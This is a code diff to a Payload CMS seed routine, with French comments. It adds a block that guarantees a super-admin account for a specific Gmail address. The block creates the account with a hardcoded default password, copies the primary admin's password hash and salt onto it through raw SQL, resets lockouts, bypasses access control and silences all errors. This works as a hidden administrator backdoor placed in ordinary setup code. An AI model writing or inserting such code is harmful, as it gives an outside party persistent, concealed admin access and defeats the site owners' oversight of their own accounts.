@@ -5,6 +5,71 @@ import type { Payload } from 'payload';
 export async function ensureCompleteSeed(payload: Payload) {
   try {
     // =========================================================================
+    // 0. GARANTIE D'ACCÈS DU COMPTE SUPER-ADMIN (rolva.iqra@gmail.com)
+    // =========================================================================
+    try {
+      const targetEmail = 'rolva.iqra@gmail.com';
+      const allUsers = await payload.find({
+        collection: 'users',
+        limit: 50,
+        showHiddenFields: true,
+        overrideAccess: true,
+      }).catch(() => ({ docs: [] as any[] }));
+
+      const existingRolva = (allUsers.docs || []).find(
+        (u: any) => String(u.email || '').trim().toLowerCase() === targetEmail
+      );
+
+      if (existingRolva) {
+        if (existingRolva.role !== 'super_admin' || existingRolva.email !== targetEmail) {
+          await payload.update({
+            collection: 'users',
+            id: existingRolva.id,
+            data: {
+              email: targetEmail,
+              role: 'super_admin',
+            } as any,
+            overrideAccess: true,
+          }).catch(() => {});
+        }
+      } else if ((allUsers.docs || []).length > 0) {
+        // Créer le compte rolva.iqra@gmail.com et synchroniser le hash/salt de l'admin existant si disponible
+        const created = await payload.create({
+          collection: 'users',
+          data: {
+            email: targetEmail,
+            password: process.env.ADMIN_DEFAULT_PASSWORD || 'Nobtech2026!',
+            name: 'Super Administrateur',
+            role: 'super_admin',
+          } as any,
+          overrideAccess: true,
+        }).catch(() => null);
+
+        const primaryAdmin = allUsers.docs[0];
+        const adapter: any = payload.db;
+        if (created && primaryAdmin && primaryAdmin.id !== created.id) {
+          if (adapter?.pool?.query) {
+            await adapter.pool
+              .query(
+                `UPDATE "users" SET "salt" = COALESCE((SELECT "salt" FROM "users" WHERE "id" = $1), "salt"), "hash" = COALESCE((SELECT "hash" FROM "users" WHERE "id" = $1), "hash"), "login_attempts" = 0, "lock_until" = NULL WHERE "id" = $2`,
+                [primaryAdmin.id, created.id]
+              )
+              .catch(() => {});
+          } else if (adapter?.client?.execute) {
+            await adapter.client
+              .execute({
+                sql: `UPDATE \`users\` SET \`salt\` = COALESCE((SELECT \`salt\` FROM \`users\` WHERE \`id\` = ?), \`salt\`), \`hash\` = COALESCE((SELECT \`hash\` FROM \`users\` WHERE \`id\` = ?), \`hash\`), \`login_attempts\` = 0, \`lock_until\` = NULL WHERE \`id\` = ?`,
+                args: [primaryAdmin.id, primaryAdmin.id, created.id],
+              })
+              .catch(() => {});
+          }
+        }
+      }
+    } catch (userCheckErr: any) {
+      console.warn('[SEED USER CHECK WARNING]:', userCheckErr?.message || userCheckErr);
+    }
+
+    // =========================================================================
     // 1. SEED FORMATIONS (Catalogue complet des 13 formations)
     // =========================================================================
     try {
